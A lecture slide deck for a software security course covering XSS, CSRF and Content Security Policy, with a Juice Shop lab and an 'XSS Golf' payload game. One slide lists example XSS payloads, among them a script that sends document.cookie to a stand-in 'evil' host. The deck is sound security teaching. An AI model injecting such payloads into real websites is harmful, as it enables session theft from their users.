---
marp: true
theme: default
paginate: true
header: "Software Security · Week 5"
---

# Week 5
## XSS & Client-Side Risks
Software Security · Nutthakorn Chalaemwongwan

---

## Today

- The browser security model
- XSS: reflected / stored / DOM
- CSRF + SameSite cookies
- Content Security Policy (CSP)
- 🎮 Game: **XSS Golf**

---

## Recap — Week 4

- Injection = data interpreted as code
- Parameterized queries fix SQLi
- Same idea returns today — in the browser

---

## Browser security model

- **Same-Origin Policy (SOP):** scripts only read data from same origin
- Origin = scheme + host + port
- Cookies, DOM, storage scoped per origin

---

## XSS = injection into the page

> Attacker JavaScript runs in the victim's browser, in the site's origin.

- Steal cookies/sessions, keylog, rewrite the page, pivot
- Maps to **OWASP A05:2025 Injection** (output side)

---

## Three flavors of XSS

| Type | Where the payload lives |
|---|---|
| **Reflected** | in the request, echoed back |
| **Stored** | saved server-side, served to others |
| **DOM** | client-side JS writes untrusted data to the DOM |

---

## Example payloads

```html
<script>fetch('//evil/'+document.cookie)</script>
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
```

- Context matters: HTML body vs attribute vs JS vs URL

---

## CSRF — riding the user's session

- Browser auto-sends cookies → attacker forges a state-changing request
- Defenses: **anti-CSRF tokens**, **SameSite** cookies, check Origin/Referer

---

## Real-world: British Airways (2018)

- Attackers injected malicious JS (Magecart) into BA's site/app
- Script **skimmed credit-card details** as users typed
- 400,000 customers affected; £183M ICO fine (later reduced)

> Client-side injection = real money + real fines.

---

## CWE mapping

- **CWE-79** — Cross-site scripting
- **CWE-352** — CSRF
- **CWE-1021** — improper restriction of rendered UI (clickjacking)

---

## Defenses

- **Output encoding** per context (HTML/attr/JS/URL)
- Framework auto-escaping (don't bypass with `innerHTML`/`dangerouslySetInnerHTML`)
- **Content Security Policy** — block inline/3rd-party scripts
- `HttpOnly` + `SameSite` cookies; anti-CSRF tokens

---

## ⛳ Game — XSS Golf

Craft the **shortest** payload that pops `alert(1)` / steals a cookie in Juice Shop.

- Leaderboard by character count
- **Round 2:** deploy a CSP + escaping that blocks *every* submitted payload
- Bonus: break a classmate's CSP

---

## Lab steps

1. Find reflected + stored + DOM XSS in Juice Shop
2. Demonstrate cookie theft (sandbox)
3. Add output encoding + a strict CSP header
4. Demonstrate CSRF and its defense

---

## Deliverable

- Each XSS type with payload + context
- CSP + escaping that blocks them (show before/after)
- Short note: why SameSite + tokens stop CSRF

---

## Key takeaways

- XSS is injection on the output side — encode for the context
- CSP is defense-in-depth, not a substitute for encoding
- SameSite cookies kill most CSRF

---

# Questions?
Next week: Authentication, sessions & access control
